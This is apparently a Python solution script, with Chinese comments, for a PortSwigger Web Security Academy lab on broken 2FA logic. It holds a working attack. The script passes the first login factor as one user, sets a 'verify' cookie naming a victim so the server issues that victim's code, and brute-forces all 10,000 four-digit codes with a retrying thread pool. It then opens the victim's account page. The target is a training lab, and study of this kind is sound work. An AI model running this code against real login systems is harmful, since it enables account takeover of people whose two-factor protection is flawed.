import time
import threading  #提供线程间同步工具
from concurrent.futures import ThreadPoolExecutor  #导入线程池
from urllib.parse import urljoin
from urllib3.util.retry import Retry
import requests
from requests.adapters import HTTPAdapter #用于配置连接池
import urllib3
urllib3.disable_warnings()

LAB = "https://0a98002703d67611806b8a550061001f.web-security-academy.net/"
WORKERS = 8  # 并发线程数

s = requests.Session(); s.verify = False   #关闭证书校验，否则会出现TLS警告

# 扩大连接池，避免并发时出现 "Connection pool is full" 警告
retry = Retry(total=3, backoff_factor=0.3,
                status_forcelist=[429, 502, 503],
            #需要重试的状态应当“可能自愈”，如429请求过多，
            #502/503网关错误/服务不可用属于瞬态故障，后端可能正在重启或过载，稍后自愈
                allowed_methods=frozenset(["GET", "POST"]))
#urllib3 默认只对幂等方法（GET/HEAD/PUT/DELETE 等）重试，POST 默认不重试。设计理由是：
#重发一个"创建订单/转账"的 POST 可能造成重复执行——服务器可能已经处理了第一次请求，只是响应在网络里丢了，你再发一次就下单两次。
#但在这个爆破场景里，提交验证码失败无副作用，所以显式把 POST 加进白名单。
adapter = HTTPAdapter(pool_connections=WORKERS, pool_maxsize=WORKERS,
                        pool_block=True, max_retries=retry)  # pool_block=True 避免连接池抖动
s.mount("https://", adapter)
s.mount("http://", adapter)

# 关键点：本实验（2FA broken logic）用一个名为 verify 的 **Cookie** 来标识
# “当前正在验证谁的 2FA”，而不是查询参数或表单字段。
# 把它设成 carlos，服务器就会为 carlos 生成 / 校验验证码——这正是逻辑漏洞所在。
VERIFY_COOKIE = {"verify": "carlos"}

def lab_url(path):
    return urljoin(LAB, path.lstrip("/"))

def request_with_retries(method, path, **kwargs):
#return一个响应
    for attempt in range(3):
        try:
            return s.request(method, lab_url(path), timeout=30, **kwargs)
        except (requests.exceptions.SSLError,
                requests.exceptions.ConnectionError,
                requests.exceptions.Timeout) as exc:  #这里只捕获 TLS 错误、连接错误和超时错误
            if attempt == 2:
                raise
            wait_seconds = attempt + 1
            print(f"请求失败（{exc.__class__.__name__}),{wait_seconds} 秒后重试")
            time.sleep(wait_seconds)

# 第一步：用 wiener 的密码通过第一关（只完成第一因子，拿到已登录的 session Cookie）
r_login = request_with_retries("POST", "login", data={"username": "wiener", "password": "peter"},
                     allow_redirects=False)
print(r_login.headers)
# 凭据正确时通常 302 跳转到 /login2；顺带做一次健壮性校验，避免第一步就失败却继续往下跑
if r_login.status_code not in (200, 302):
    raise SystemExit(f"第一步登录异常，状态码={r_login.status_code}，请检查凭据 / LAB 地址")
    
#登录成功后响应里收到cookie={'verify':'wiener'}
# 第二步：带上 verify=carlos 的 Cookie 访问 login2，让服务器为 carlos 生成验证码
# （verify 走 Cookie，而不是 params）
request_with_retries("GET", "login2", cookies=VERIFY_COOKIE)

# 第三步：并发爆破 carlos 的验证码
found = threading.Event()
result = {}
counter = 0
counter_lock = threading.Lock()
start = time.monotonic()  # 在启动线程前就定义好，供 try_code 里计算 req/s


def try_code(i):
    global counter
    if found.is_set():
        return
    code = f"{i:04d}"
    r = request_with_retries("POST", "login2",
                             data={"mfa-code": code},   # 表单体里只放 mfa-code
                             cookies=VERIFY_COOKIE,      # verify=carlos 走 Cookie
                             allow_redirects=False)
    if r.status_code == 302 and r.headers.get("Location", "").startswith("/my-account"):
        found.set()
        result["code"] = code
        result["location"] = r.headers["Location"]
        
        snapshot = {c.name: c.value for c in s.cookies}
        snapshot.update({c.name: c.value for c in r.cookies})  
        #.update()覆盖或添加键和键值
        result["cookies"] = snapshot
        #由于每次向服务器发请求都可能更新cookie，必须把成功登录时r.cookie内的有效cookie寄存起来以覆盖旧值

        return
    with counter_lock:
        counter += 1
        if counter % 20 == 0:
            rps = counter / (time.monotonic() - start)
            print(f"{counter}  {rps:.1f} req/s")
            print(f"[+]s.cookie:{s.cookies}")
            print(f"[+]r.cookie:{r.cookies}")


with ThreadPoolExecutor(max_workers=WORKERS) as ex:
    futures = [ex.submit(try_code, i) for i in range(10000)]
    # 创建一个含10000个Future对象的列表，每个 Future 代表一个在线程/进程池中运行的异步任务
    # 但同时执行的任务数最大为max_workers，剩余10000-max_workers个任务排队等待
    while not found.is_set() and any(not f.done() for f in futures):
#当任务完成时f.done()返回True，未完成返回False
#any():当括号内重复执行的表达式有一个返回True，any()返回True，否则False
    #当有线程命中时（成功）退出循环，或所有任务都完成（not f.done()均返回False）但未命中目标时（失败）退出循环
        time.sleep(0.1)
    for f in futures:
        f.cancel()
    #while循环执行完毕后（无论命中目标与否），终止未执行的剩余任务
#出了with块后自动关闭ex

if result:
    print("命中:", result["code"], "->", result["location"])
    r2 = request_with_retries("GET", result["location"], cookies=result["cookies"])
# 用中标时快照下来的已认证 Cookie 去访问账户页，绕开被并发写脏的共享 Cookie 罐
    print("carlos 账户页:", r2.text)
else:
    print("未命中任何验证码")

# ```爆破验证码过程中的cookie:
# [+]s.cookie:
# <RequestsCookieJar
# [
# <Cookie verify=wiener for 0a98002703d67611806b8a550061001f.web-security-academy.net/>,
# <Cookie session=7RwHsg3o24ofVyhtv8s3Sr8CQYLupTTj for 0a98002703d67611806b8a550061001f.web-security-academy.net/>
# ]
# >
# [+]r.cookie:<RequestsCookieJar[]>
# ```
